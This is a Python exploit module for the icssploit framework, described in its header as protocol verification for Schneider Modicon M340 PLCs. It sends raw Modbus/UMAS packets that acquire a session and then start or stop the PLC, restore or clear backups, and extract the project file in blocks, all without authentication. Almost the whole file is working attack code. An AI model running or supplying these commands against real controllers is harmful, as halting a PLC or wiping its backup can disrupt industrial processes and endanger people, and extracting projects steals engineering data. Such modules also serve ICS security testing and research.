'''
	该文件用于Isf中对于M340设备的协议验证
'''

from icssploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    mute,
    validators,
)
import socket
import os
from struct import *

get_session_payload = '013800000018005a0010337700000f57494e2d5039504b48485643495538'.decode(
    'hex')  # Func Code:0x10,create sessionId in advance.


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'Schneider Midicon M340 series PLC Control',
        'authors': [
            'MeetFireAgain <https://github.com/MeetFireAgain>'
        ],
        'description': 'Use Modbus command to start/stop/read/ plc.', #More 
        'references': [
            'https://github.com/MeetFireAgain/blob/master/module/exploits/Schneider/Modicon_M340_plc_control.py'   # more
        ],
        'devices': [
            'Schneider Modicon M340 series programmable logic controllers (PLCs)',
        ],
    }

    target = exploits.Option(
        '', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)
    port = exploits.Option(502, 'Target Port', validators=validators.integer)
    command = exploits.Option(
        14, 'Command 40:start plc, 41:stop plc, 1:init_comm, 2:read_id, 3:read_project_info, 4:read_plc_info, 6:read_card_info,\
            12:heartbeat@2,42:job initial,22:connect plc under monitor mode,361:Compare to backup,362:restore backup,363:save backup,\
                364:clear backup,33:File_extract from plc,50:system bits read,58:plc status.', validators=validators.integer)
    sock = None
    session = ""

    def get_session(self):
        self.sock.send(get_session_payload)
        rsp = self.sock.recv(1024)
        if rsp:
            self.session = rsp[:-1].encode('hex')
            return True
        else:
            return False

    def exploit(self):
        self.sock = socket.socket()
        self.sock.settimeout(3)
        self.sock.connect((self.target, self.port))
        if self.get_session():
            if self.command == 40:
                print_status("Start plc")
                buff = ('015300000006005a' + self.session +
                        '40ff00').decode('hex')
                self.sock.send(buff)
            elif self.command == 41:
                print_status("Stop plc")
                buff = ('015800000006005a' + self.session +
                        '41ff00').decode('hex')
                self.sock.send(buff)
            elif self.command== 2:
                print_status("Init_Comm")
                buff = ('07a100000004005a0002').decode('hex')
                self.sock.send(buff)
            elif self.command==1:
                print_status("Read ID")
                buff = ('078c00000005005a000100').decode('hex')
                self.sock.send(buff)
            elif self.command == 3:
                print_status("read_project_info")
                buff = ('078c00000005005a000100').decode('hex')
                self.sock.send(buff)
            elif self.command == 4:
                print_status("read_plc_info/heartbeat @1")
                buff = ('078c00000005005a000100').decode('hex')
                self.sock.send(buff)
            elif self.command == 12:
                print_status("heartbeat @2")
                buff = ('079d00000004005a' + self.session +
                        '12').decode('hex')
                self.sock.send(buff)
            elif self.command==6:
                print_status("read_card_info")
                buff = ('080700000005005a000600').decode('hex')
                self.sock.send(buff)
            elif self.command == 42:
                print_status("job initial")
                buff = ('080700000007005a'+self.session+
                    '420000').decode('hex')
                self.sock.send(buff)
            elif self.command == 22:
                print_status("connect plc under monitor mode")
                buff = ('080700000012005a'+
                        '0022a411960e01202d00010000020211').decode('hex')
                self.sock.send(buff)
            elif self.command == 361:
                print_status("Compare to backup")
                buff = ('080700000007005a' + self.session +
                        '36010000').decode('hex')
                self.sock.send(buff)
            elif self.command == 362:
                print_status("restore backup")
                buff = ('080800000007005a' + self.session +
                        '36020000').decode('hex')
                self.sock.send(buff)
            elif self.command == 363:
                print_status("restore backup")
                buff = ('080900000007005a' + self.session +
                        '36030000').decode('hex')
                self.sock.send(buff)
            elif self.command == 364: # Something here!!!!
                print_status("restore backup")
                buff = ('080a00000007005a' + self.session +
                        '36040000').decode('hex')
                self.sock.send(buff)
            
            elif self.command==33:# file extract from plc to pc
                print_status("Fileextract from plc")
                buff = ('080b00000008005a' + self.session +
                        '330001fb03').decode('hex') # 0x33,start
                self.sock.send(buff)
                rsp = self.sock.recv(1028)
                print("~~~~~~~~~~~~~~~")
                print(rsp)
                trasactionID=2022
                Block=1
                while Block<=57:  
                    # It shows that,when the last block number is the same with the block number in the 0x35 packet,it will return true.
                    # From now,I don't  exactly know which block is the end of the project! So it is feasible in this example
                    print("Block #%d"%Block)
                    Tobesent = pack('>h', trasactionID)+b'\x00\x00' +\
                        pack('>h', 8)+b'\x00'+ b'\x5a'+\
                            self.session.decode('hex')+b'\x34'+b'\x00\x01' + pack('>h', Block)+b'\x00'
                    self.sock.send(Tobesent)
                    rsp = self.sock.recv(1028)
                    print(rsp)
                    Block+=1
                buff = pack('>h', trasactionID)+b'\x00\x00' +\
                    pack('>h', 8)+b'\x00'+ b'\x5a' + self.session.decode('hex')+b'\x35' + b'\x00\x01'+\
                        pack('>h', Block-1)+b'\x00'
                self.sock.send(buff)
            
            # 0x58,0x50
            elif self.command == 50:  # Something here!!!!
                # There are some of different packets
                print_status("0x50 packets")                
                print("Packet #1:5adf5015000107")
                buff = ('080a00000008005a' + self.session +
                        '5015000107').decode('hex')
                self.sock.send(buff)
                rsp = self.sock.recv(1028) # Maybe there is a problem here

                print("Packet #2:5adf5015000209010f00020007")
                buff = ('080a0000000e005a' + self.session +
                        '5015000209010f00020007').decode('hex')
                self.sock.send(buff)
                rsp = self.sock.recv(1028)  

                print("Packet #3:5015000105010400000001")
                buff = ('080a0000000e005a' + self.session +
                        '5015000105010400000001').decode('hex')
                self.sock.send(buff)

            elif self.command==58:
                print_status("0x58 packets") 

                print("Packet #1:013f0000000d005a00580100000000ffff0000")
                buff = ('013f0000000d005a00580100000000ffff0000').decode('hex')
                self.sock.send(buff)
                rsp = self.sock.recv(1028)  # Maybe there is a problem here

                print("Packet #2:01ef0000000d005a0058020100000000000000")
                buff = ('01ef0000000d005a0058020100000000000000').decode('hex')
                self.sock.send(buff)
                rsp = self.sock.recv(1028)  # Maybe there is a problem here

                print("Packet #3:035e0000000d005a005807018000000000fb03")
                buff = ('035e0000000d005a005807018000000000fb03').decode('hex')
                self.sock.send(buff)

            else:
                print_error("Command %s didn't support" % self.command)
            
            rsp = self.sock.recv(1028)
            for i in range(len(bytes(rsp))):
                print(bytes(rsp)[i],)
            print('\n')
        else:
            print_error("Can't get session, stop exploit.")

    def run(self):
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
        else:
            print_error("Target is not alive")

    @mute
    # TODO: Add check later
    def check(self):
        pass

    def _check_alive(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
        except Exception:
            return False
        return True
